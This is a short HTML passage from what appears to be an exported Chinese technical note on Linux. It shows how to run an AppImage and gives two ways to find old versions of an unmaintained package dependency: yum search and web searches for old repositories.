href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7008992b-7827-4206-8a6d-0322f721880b" class="code"><code class="language-Shell">$ ./YourApp.AppImage</code></pre><h3 id="1880427e-38bb-8071-bd16-eeef865a81d8" class="">2-软件包依赖的版本统一问题</h3><p id="0df6bd01-d3ef-43c0-baaf-ab8685439633" class="">例如a包依赖于b包的一个旧版本，但是该版本已经被停止维护，怎么办？<div class="indented"><p id="396ae8bc-2917-4465-a286-26175fb790ec" class="">方案1：使用<mark class="highlight-default"><code>yum search 关键字</code></mark>，或许可以查找到一些旧版本</p><p id="888a8bf1-7d7f-46f3-9ab5-c18ac56bce2e" class="">方案2：在百度搜索该项目，看能不能找到一些旧版本仓库</p></div></p><p id="6549ac84-4dc8-4ebb-950e-2e62f2cf5dce" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>